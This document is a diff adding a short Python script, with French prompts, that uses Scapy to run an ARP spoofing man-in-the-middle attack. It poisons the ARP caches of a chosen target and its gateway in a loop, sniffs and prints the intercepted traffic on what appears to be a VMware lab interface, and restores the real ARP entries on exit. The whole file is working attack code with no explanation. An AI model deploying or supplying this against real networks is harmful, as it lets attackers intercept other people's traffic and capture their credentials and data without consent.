@@ -1,0 +1,31 @@
+from scapy.all import *
+from scapy.all import ARP, getmacbyip
+
+ip_cible = input("Entrez l'adresse IP de la machine cible : ")
+ip_passerelle = input("Entrez l'adresse IP de la passerelle : ")
+
+def spoof(ip_cible, spoof_ip) :
+    packet = ARP(op = 2, pdst = ip_cible, hwdst = getmacbyip(ip_cible), psrc = spoof_ip)
+    send(packet, verbose=False)
+
+def restoration(ip_destination, ip_source) :
+    mac_destination = getmacbyip(ip_destination)
+    mac_source = getmacbyip(ip_source)
+    packet = ARP(op = 2, pdst = ip_destination, hwdst = mac_destination, psrc = ip_source, hwsrc = mac_source)
+    send(packet, verbose=False)
+
+try :
+    while True : 
+        spoof(ip_cible, ip_passerelle)
+        spoof(ip_passerelle, ip_cible)
+        sniff(iface="VMware Network Adapter VMnet8",prn=lambda x:x.summary())
+        sniff(iface="VMware Network Adapter VMnet8",prn=lambda x:x.show())
+
+except KeyboardInterrupt :
+    restoration(ip_passerelle, ip_cible)
+    restoration(ip_cible, ip_passerelle)
+
+
+
+
+
